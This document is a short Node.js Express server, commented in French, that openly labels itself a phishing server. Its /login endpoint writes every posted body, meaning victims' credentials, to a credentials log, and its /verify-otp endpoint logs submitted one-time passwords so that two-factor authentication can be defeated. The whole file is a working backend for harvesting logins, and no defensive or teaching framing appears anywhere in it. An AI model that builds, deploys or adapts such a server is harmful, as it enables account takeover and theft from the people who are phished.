const express = require('express');
const fs = require('fs');
const app = express();
app.use(express.json());

// Middleware de logging
app.use((req, _, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

// Stockage des credentials
app.post('/login', (req, res) => {
  const data = {
    ...req.body,
    receivedAt: new Date().toISOString()
  };
  
  fs.appendFileSync('./logs/credentials.log', JSON.stringify(data) + '\n');
  res.sendStatus(200);
});

// Stockage des OTP
app.post('/verify-otp', (req, res) => {
  fs.appendFileSync('./logs/otp_attempts.log', JSON.stringify(req.body) + '\n');
  res.sendStatus(200);
});

// Démarrer le serveur
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Phishing server running on port ${PORT}`);
  console.log(`Endpoints:
  - POST /login
  - POST /verify-otp`);
});
